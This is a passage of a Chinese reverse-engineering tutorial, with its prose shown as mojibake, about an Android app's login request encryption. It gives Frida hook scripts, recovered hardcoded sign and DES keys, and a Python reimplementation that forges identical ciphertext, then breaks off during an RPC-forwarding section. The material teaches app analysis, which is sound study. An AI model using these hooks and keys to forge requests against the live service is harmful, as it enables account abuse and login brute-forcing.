264</span><br><span class="line"></span><br><span class="line">&#123;&quot;Encrypt&quot;:&quot;NIszaqFPos1vd0pFqKlB42Np5itPxaNH\/\/FDsRnlBfgL4lcVxjXii02ggCULFNaeuVKT\/FXC+BMD\nbmIP0xrILw+btCAOv\/RTB58iDYS9BneDRhHyJkzHZpgn+2fSdkhXpYri+OFeZ+MGhIR+Vqny4\/K5\nnBpbSsQk3dnxQYVkLC64nN947cLFIUOcvnABk93q8ih6kqT53Hj0yxQbl3ksduKCO4P\/pZPpQzAG\n6DUPk6s=\n&quot;&#125;</span><br></pre></td></tr></table></figure><p>è¿”å›å€¼å’ŒæŠ“åŒ…å¾—åˆ°<code>Encrypt</code>çš„valueæ˜¯ä¸€æ ·çš„</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;equtype&quot;:&quot;ANDROID&quot;,&quot;loginImei&quot;:&quot;Android352689080920725&quot;,&quot;sign&quot;:&quot;D890E5736DE831FE31CFEAB80EA79808&quot;,&quot;timeStamp&quot;:&quot;1759499341310&quot;,&quot;userPwd&quot;:&quot;12345678 &quot;,&quot;username&quot;:&quot;12345678901&quot;&#125;</span><br></pre></td></tr></table></figure><p><code>timeStamp</code>æ˜¯æ—¶é—´æˆ³ï¼Œé€šè¿‡<code>String s = System.currentTimeMillis() + &quot;&quot;;</code>è·å–</p><p>å…¶ä»–å­—æ®µéƒ½æ˜¯æ˜æ–‡ï¼Œé‡ç‚¹çœ‹<code>sign</code>å­—æ®µæ˜¯å¦‚ä½•å¾—åˆ°çš„</p><p>Hook<code>paraMap</code>å‡½æ•°</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">timeStamp : 1759500042670</span><br><span class="line">loginImei : Android352689080920725</span><br><span class="line">equtype : ANDROID</span><br><span class="line">userPwd : 12345678</span><br><span class="line">username : 12345678901</span><br></pre></td></tr></table></figure><p>mapé‡Œçš„å†…å®¹æ˜¯ä»¥ä¸Šçš„æ˜æ–‡å­—æ®µï¼Œå› æ­¤signæ˜¯åœ¨å½“å‰å‡½æ•°äº§ç”Ÿçš„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">paraMap</span><span class="params">(Map map0, String append, String sign)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Set</span> <span class="variable">set0</span> <span class="operator">=</span> map0.keySet();</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="type">ArrayList</span> <span class="variable">list</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        <span class="keyword">for</span>(Object object0: set0) &#123;</span><br><span class="line">            list.add(((String)object0) + <span class="string">&quot;=&quot;</span> + ((String)map0.get(((String)object0))));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Collections.sort(list);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; list.size(); ++i) &#123;</span><br><span class="line">            builder.append(((String)list.get(i)));</span><br><span class="line">            builder.append(<span class="string">&quot;&amp;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        builder.append(<span class="string">&quot;key=&quot;</span> + append);</span><br><span class="line">        map0.put(<span class="string">&quot;sign&quot;</span>, Utils.md5(builder.toString()).toUpperCase());</span><br><span class="line">        <span class="type">String</span> <span class="variable">s2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Gson</span>().toJson(RequestUtil.sortMapByKey(map0));</span><br><span class="line">        Log.w(<span class="string">&quot;yang&quot;</span>, s2 + <span class="string">&quot;   result&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> s2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»map0ä¸­è·å–æ‰€æœ‰çš„keyï¼Œç„¶åæŒ‰ç…§key&#x3D;valueçš„æ ¼å¼æ”¾åˆ°ä¸€ä¸ªlisté‡Œï¼Œä¹‹åè¿›è¡Œå­—å…¸æ’åºï¼Œç„¶åç”¨<code>&amp;</code>å°†æ¯ä¸ªé”®å€¼å¯¹æ‹¼æ¥èµ·æ¥ï¼Œæœ€åå°†å…¶MD5å°±è·å¾—äº†<code>sign</code>ï¼Œå› æ­¤æˆ‘ä»¬hook<code>md5</code>å‡½æ•°å°±èƒ½å¾—åˆ°å‚æ•°æ˜¯ä»€ä¹ˆäº†</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">md5: equtype=ANDROID&amp;loginImei=Android352689080920725&amp;timeStamp=1759500651664&amp;userPwd=12345678 &amp;username=12345678901&amp;key=sdlkjsdljf0j2fsjk</span><br><span class="line">returnValue: 7514354356ba3ea708a5df7bcd139bbd</span><br><span class="line">returnValue: &#123;&quot;equtype&quot;:&quot;ANDROID&quot;,&quot;loginImei&quot;:&quot;Android352689080920725&quot;,&quot;sign&quot;:&quot;7514354356BA3EA708A5DF7BCD139BBD&quot;,&quot;timeStamp&quot;:&quot;1759500651664&quot;,&quot;userPwd&quot;:&quot;12345678 &quot;,&quot;username&quot;:&quot;12345678901&quot;&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æ˜¯é€šè¿‡é¦–å­—ç¬¦å‡åºæ’åºçš„ï¼Œ<code>key</code>ä¹Ÿæ˜¯ä¸€ä¸ªå›ºå®šçš„å€¼</p><p>ç„¶åè¯¦ç»†çœ‹åŠ å¯†ç®—æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">encodeDesMap</span><span class="params">(String data, String desKey, String desIV)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">DesSecurity</span>(desKey, desIV).encrypt64(data.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">DesSecurity</span><span class="params">(String key, String iv)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">if</span>(key == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>(<span class="string">&quot;Parameter is null!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.InitCipher(key.getBytes(), iv.getBytes());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">InitCipher</span><span class="params">(<span class="type">byte</span>[] secKey, <span class="type">byte</span>[] secIv)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">MessageDigest</span> <span class="variable">messageDigest0</span> <span class="operator">=</span> MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">    messageDigest0.update(secKey);</span><br><span class="line">    <span class="type">DESKeySpec</span> <span class="variable">dsk</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DESKeySpec</span>(messageDigest0.digest());</span><br><span class="line">    <span class="type">SecretKey</span> <span class="variable">secretKey0</span> <span class="operator">=</span> SecretKeyFactory.getInstance(<span class="string">&quot;DES&quot;</span>).generateSecret(dsk);</span><br><span class="line">    <span class="type">IvParameterSpec</span> <span class="variable">iv</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IvParameterSpec</span>(secIv);</span><br><span class="line">    <span class="built_in">this</span>.enCipher = Cipher.getInstance(<span class="string">&quot;DES/CBC/PKCS5Padding&quot;</span>);</span><br><span class="line">    <span class="built_in">this</span>.deCipher = Cipher.getInstance(<span class="string">&quot;DES/CBC/PKCS5Padding&quot;</span>);</span><br><span class="line">    <span class="built_in">this</span>.enCipher.init(<span class="number">1</span>, secretKey0, iv);</span><br><span class="line">    <span class="built_in">this</span>.deCipher.init(<span class="number">2</span>, secretKey0, iv);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">byte</span>[] decrypt64(String data) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.deCipher.doFinal(Base64.decode(data, <span class="number">0</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨åˆå§‹åŒ–Cipherå‡½æ•°ä¸­ï¼Œä¼šè·å–ä¸€ä¸ªMD5ï¼Œç„¶åå°†secKeyæ¨è¿›å»ï¼Œä¹‹åè°ƒç”¨DESçš„è·å–å¯†é’¥çš„å‡½æ•°å°†dskæˆªæ–­ï¼Œä¹‹åä½¿ç”¨MD5åçš„Keyå’ŒåŸå§‹IVè¿›è¡ŒDESåŠ å¯†ï¼ŒåŠ å¯†æ¨¡å¼ä¸º<code>DES/CBC/PKCS5Padding</code></p><p>å› æ­¤æ•´ä¸ªæµç¨‹æ˜¯ï¼šå…ˆå°†<code>equtype</code>ã€<code>loginImei</code>ã€<code>timeStamp</code>ã€<code>userPwd</code>ã€<code>username</code>å’Œ<code>key</code>æ‹¼æ¥èµ·æ¥ï¼Œåªæœ‰<code>userPwd</code>å’Œ<code>username</code>æ˜¯ç”¨æˆ·ä¼ å…¥çš„ç„¶åå‰©ä¸‹æ˜¯æ—¶é—´æˆ³æˆ–å›ºå®šçš„è®¾å¤‡å‚æ•°æˆ–è€…ç¡¬ç¼–ç ï¼Œä¹‹åå°†å…¶MD5åæ‹¼æ¥åˆ°<code>sign</code>çš„<code>value</code>ï¼Œä½œä¸ºæ–°çš„<code>map</code>ï¼Œä¹‹åå°†<code>Key</code>è¿›è¡Œä¸€æ¬¡<code>MD5</code>ç„¶åå°†å…¶å’ŒåŸæœ¬çš„<code>IV</code>ä½œä¸ºå¯†é’¥å¯¹æ–°çš„<code>map</code>è¿›è¡ŒåŠ å¯†ï¼Œå¾—åˆ°çš„å°±æ˜¯æœ€åçš„<code>Encrypt</code></p><h3 id="ç®—æ³•è¿˜åŸ"><a href="#ç®—æ³•è¿˜åŸ" class="headerlink" title="ç®—æ³•è¿˜åŸ"></a>ç®—æ³•è¿˜åŸ</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">sign_string=<span class="string">&#x27;equtype=ANDROID&amp;loginImei=Android352689080920725&amp;timeStamp=1759501463192&amp;userPwd=12345678 &amp;username=12345678901&amp;key=sdlkjsdljf0j2fsjk&#x27;</span>;</span><br><span class="line">md5_sign=hashlib.md5(sign_string.encode()).hexdigest().upper()</span><br><span class="line"><span class="comment"># print(md5_string)</span></span><br><span class="line"></span><br><span class="line">user_string=<span class="string">&#x27;&#123;&quot;equtype&quot;:&quot;ANDROID&quot;,&quot;loginImei&quot;:&quot;Android352689080920725&quot;,&quot;sign&quot;:&quot;&#x27;</span>+<span class="built_in">str</span>(md5_sign)+<span class="string">&#x27;&quot;,&quot;timeStamp&quot;:&quot;1759501463192&quot;,&quot;userPwd&quot;:&quot;12345678 &quot;,&quot;username&quot;:&quot;12345678901&quot;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;user_string=<span class="subst">&#123;user_string&#125;</span>&quot;</span>)</span><br><span class="line">key_string = <span class="string">&quot;65102933&quot;</span></span><br><span class="line">key_md5 = hashlib.md5(key_string.encode()).digest()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;key_md5=<span class="subst">&#123;key_md5&#125;</span>&quot;</span>)</span><br><span class="line">key = key_md5[:<span class="number">8</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;key=<span class="subst">&#123;key&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">iv = <span class="string">&quot;32028092&quot;</span>.encode()</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(iv) &lt; <span class="number">8</span>:</span><br><span class="line">    iv = iv + <span class="string">b&#x27;\0&#x27;</span> * (<span class="number">8</span> - <span class="built_in">len</span>(iv))</span><br><span class="line"><span class="keyword">elif</span> <span class="built_in">len</span>(iv) &gt; <span class="number">8</span>:</span><br><span class="line">    iv = iv[:<span class="number">8</span>]</span><br><span class="line">data = user_string.encode()</span><br><span class="line">padded_data = pad(data, DES.block_size)</span><br><span class="line">cipher = DES.new(key, DES.MODE_CBC, iv)</span><br><span class="line">encrypted_data = cipher.encrypt(padded_data)</span><br><span class="line">encrypted_base64 = base64.b64encode(encrypted_data).decode()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;åŠ å¯†åçš„ç»“æœ: <span class="subst">&#123;encrypted_base64&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>å› ä¸ºä½¿ç”¨Pythonå†™åŠ è§£å¯†ç®—æ³•æ¯”è¾ƒæ–¹ä¾¿ï¼Œå› æ­¤ä½¿ç”¨pythonè¿›è¡Œç®—æ³•è¿˜åŸ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">user_string=&#123;<span class="string">&quot;equtype&quot;</span>:<span class="string">&quot;ANDROID&quot;</span>,<span class="string">&quot;loginImei&quot;</span>:<span class="string">&quot;Android352689080920725&quot;</span>,<span class="string">&quot;sign&quot;</span>:<span class="string">&quot;914CCB500B828858A16496959DE4CC7A&quot;</span>,<span class="string">&quot;timeStamp&quot;</span>:<span class="string">&quot;1759501463192&quot;</span>,<span class="string">&quot;userPwd&quot;</span>:<span class="string">&quot;12345678 &quot;</span>,<span class="string">&quot;username&quot;</span>:<span class="string">&quot;12345678901&quot;</span>&#125;</span><br><span class="line">key_md5=<span class="string">b&#x27;\xc3\xd2m\xca\x86%\x97\x82\xbd\x91\x86H\x1f\x89*\xe6&#x27;</span></span><br><span class="line">key=<span class="string">b&#x27;\xc3\xd2m\xca\x86%\x97\x82&#x27;</span></span><br><span class="line">åŠ å¯†åçš„ç»“æœ: </span><br><span class="line">NIszaqFPos1vd0pFqKlB42Np5itPxaNH//FDsRnlBfgL4lcVxjXii02ggCULFNaeuVKT/FXC+BMD</span><br><span class="line">bmIP0xrIL5+cfhEzMXyKHy4xuh0h19w1UoI+CUlznYRWafwBDARtKnpa1J/s5fecfmKDlU6dbU70</span><br><span class="line">CC9YUEGfzovqMpwa+LSpI8uI0g8zWl8z9CGsfPmQirjlSp41/YR/AvN6QLOGCxJbcAk8Zlh2O2nR</span><br><span class="line">Z9vurSE=</span><br><span class="line"></span><br><span class="line">returnValue: </span><br><span class="line">NIszaqFPos1vd0pFqKlB42Np5itPxaNH//FDsRnlBfgL4lcVxjXii02ggCULFNaeuVKT/FXC+BMD</span><br><span class="line">bmIP0xrIL5+cfhEzMXyKHy4xuh0h19w1UoI+CUlznYRWafwBDARtKnpa1J/s5fecfmKDlU6dbU70</span><br><span class="line">CC9YUEGfzovqMpwa+LSpI8uI0g8zWl8z9CGsfPmQirjlSp41/YR/AvN6QLOGCxJbcAk8Zlh2O2nR</span><br><span class="line">Z9vurSE=</span><br></pre></td></tr></table></figure><p>ä¸€æ¯›ä¸€æ ·ï¼ï¼ï¼</p><h4 id="hook-js"><a href="#hook-js" class="headerlink" title="hook.js"></a>hook.js</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">RequestUtil</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.dodonew.online.http.RequestUtil&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">RequestUtil</span>);</span><br><span class="line">    <span class="title class_">RequestUtil</span>.<span class="property">encodeDesMap</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">a,b,c</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;data: &quot;</span>+a);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;desKey: &quot;</span>+b);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;desIV: &quot;</span>+c);</span><br><span class="line">        <span class="keyword">var</span> returnValue = <span class="variable language_">this</span>.<span class="title function_">encodeDesMap</span>(a,b,c);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;returnValue: &quot;</span>+returnValue);</span><br><span class="line">        <span class="keyword">return</span> returnValue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">RequestUtil</span>.<span class="property">paraMap</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.util.Map&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">a,b,c</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;map0 ç±»å‹: &quot;</span> + (a ? a.<span class="property">$className</span> : <span class="string">&quot;null&quot;</span>));</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// æ‰“å°Mapå†…å®¹</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (a != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;mapå†…å®¹:&quot;</span>);</span><br><span class="line">                <span class="keyword">var</span> keySet = a.<span class="title function_">keySet</span>();</span><br><span class="line">                <span class="keyword">var</span> keyArray = keySet.<span class="title function_">toArray</span>();</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; keyArray.<span class="property">length</span>; i++) &#123;</span><br><span class="line">                    <span class="keyword">var</span> key = keyArray[i];</span><br><span class="line">                    <span class="keyword">var</span> value = a.<span class="title function_">get</span>(key);</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(key + <span class="string">&quot; : &quot;</span> + value);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;æ‰“å°Mapå†…å®¹æ—¶å‡ºé”™: &quot;</span> + e);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;append: &quot;</span>+b);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;sign: &quot;</span>+c);</span><br><span class="line">        <span class="keyword">var</span> returnValue = <span class="variable language_">this</span>.<span class="title function_">paraMap</span>(a,b,c);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;returnValue: &quot;</span>+returnValue);</span><br><span class="line">        <span class="keyword">return</span> returnValue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">Utils</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.dodonew.online.util.Utils&quot;</span>)</span><br><span class="line">    <span class="title class_">Utils</span>.<span class="property">md5</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">a</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;md5: &quot;</span>+a);</span><br><span class="line">        <span class="keyword">var</span> returnValue = <span class="variable language_">this</span>.<span class="title function_">md5</span>(a);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;returnValue: &quot;</span>+returnValue);</span><br><span class="line">        <span class="keyword">return</span> returnValue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="ç®—æ³•è½¬å‘"><a href="#ç®—æ³•è½¬å‘" class="headerlink" title="ç®—æ³•è½¬å‘"></a>ç®—æ³•è½¬å‘</h3><p>ç›´æ¥ä½¿ç”¨è¯¥Appå†…éƒ¨çš„Javaç®—æ³•æ¥è¿›è¡Œä¸€ä¸ªåŠ å¯†çš„æ“ä½œï¼Œæˆ‘ä»¬å°±ä¸ç”¨è¿›è¡Œç®—æ³•çš„è¿˜åŸäº†ï¼Œåªéœ€è¦è°ƒç”¨è¯¥Appçš„ç®—æ³•å‡½æ•°ï¼Œç„¶åæä¾›éœ€è¦çš„åŸæ–™ï¼Œé€šè¿‡Rpcæ˜ å°„åˆ°æœ¬åœ°çš„ä¸€ä¸ªç«¯å£ä¸Šï¼Œå°±èƒ½å®ç°ä¸€ä¸ªRpcè¿œç¨‹è°ƒç”¨è¯¥ç®—æ³•</p><p>ä½¿ç”¨å°è‚©è†€è¯¾ç¨‹ä¸­çš„ä»£ç ä¼šå‘ç°ä¼šæŠ¥ä¸€ä¸ªé”™è¯¯ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;error&quot;</span><span class="punctuation">:</span><span class="string">&quot;ReferenceError: &#x27;Java&#x27; is not defined\n    at hookTest (/script1.js:5)\n    at call (native)\n    at handleRpcMessage (/frida/runtime/message-dispatcher.js:39)\n    at handleMessage (/frida/runtime/message-dispatcher.js:25)&quot;</span><span class="punctuation">,</span><span class="attr">&quot;item_id&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>è¿™æ˜¯å› ä¸º<a href="https://frida.re/news/2025/05/17/frida-17-0-0-released/%E5%9C%A8%E8%BF%99%E9%87%8C%E8%AF%B4%E6%98%8Efrida17%E7%9A%84%E7%89%88%E6%9C%AC%EF%BC%8C%E6%A1%A5%E6%8E%A5%E5%99%A8%60frida-%7Bobjc,swift,java%7D-bridge%60%E4%B8%8D%E5%86%8D%E9%BB%98%E8%AE%A4%E5%8A%A0%E8%BD%BD%EF%BC%8C%E9%9C%80%E8%A6%81%E6%89%8B%E5%8A%A8%E5%AF%BC%E5%85%A5%EF%BC%8C%E4%BD%BF%E7%94%A8AI%E5%8E%BB%E9%87%8D%E5%86%99%E4%B8%80%E4%B8%AA">https://frida.re/news/2025/05/17/frida-17-0-0-released/åœ¨è¿™é‡Œè¯´æ˜frida17çš„ç‰ˆæœ¬ï¼Œæ¡¥æ¥å™¨`frida-{objc,swift,java}-bridge`ä¸å†é»˜è®¤åŠ è½½ï¼Œéœ€è¦æ‰‹åŠ¨å¯¼å…¥ï¼Œä½¿ç”¨AIå»é‡å†™ä¸€ä¸ª</a> Python è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span 